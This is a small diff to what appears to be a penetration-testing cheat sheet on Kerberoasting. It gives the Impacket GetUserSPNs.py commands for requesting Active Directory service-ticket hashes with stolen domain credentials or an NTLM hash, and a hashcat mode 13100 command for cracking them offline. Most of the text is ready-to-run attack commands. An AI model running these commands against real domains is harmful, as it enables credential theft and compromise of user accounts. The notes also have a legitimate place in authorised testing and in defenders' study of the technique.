@@ -1,6 +1,6 @@
 When you have valid domain creds try kerberoasting to get user hashes, you do not already need users.
 
-GetUserSPNs.py DOMAIN/username:password -dc-ip <DC_IP> OR GetUserSPNs.py DOMAIN/username -hashes :<NTLM> -dc-ip <DC_IP>
+GetUserSPNs.py -request DOMAIN/username:password -dc-ip dc01 
 
 hashcat -m 13100 spn_hashes.txt wordlist.txt
 
